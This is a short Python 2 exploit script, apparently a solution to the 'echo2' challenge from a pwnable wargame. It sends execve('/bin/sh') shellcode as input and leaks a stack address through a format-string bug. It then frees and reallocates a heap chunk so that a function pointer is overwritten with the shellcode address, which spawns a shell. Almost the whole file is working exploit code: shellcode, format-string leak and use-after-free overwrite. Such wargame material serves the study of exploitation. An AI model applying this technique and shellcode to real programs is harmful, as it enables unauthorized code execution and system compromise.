import subprocess
import sys
import struct

def read_until(word):
    data = ''
    letterIndex = 0
    letter = word[0]
    while word != data:
        character = p.stdout.read(1)
        sys.stdout.write(character)
        if character == letter:
            data+=character
            letterIndex+=1
            if letterIndex < len(word):
                letter = word[letterIndex]
        else:
            data = ''
            letterIndex = 0
            letter = word[letterIndex]

p = subprocess.Popen(["/home/raw/Documents/pwnable/rookis/echo2/echo2"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)

shellcode = "\x31\xf6\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

# place jmp asm in id
read_until(':')
p.stdin.write(shellcode + "\n")
read_until(">")

# read where name is stored on stack
p.stdin.write("2\n")
read_until("\n")
p.stdin.write("%10$llu\n")
name_addr = int(p.stdout.readline()) - 0x20
read_until(">")

# free initial malloc
p.stdin.write("4\n")
read_until(")")
p.stdin.write("n\n")

# re-allocate unallocated memory (replace greetings function with shellcode jump)
read_until(">")
p.stdin.write("3\n")
read_until("\n")
p.stdin.write("A"*0x18 + struct.pack("<Q",name_addr)) 
read_until(">")

# call fsb which wil jmp to shellcode now
p.stdin.write("2\n")
print p.stdout.readline()




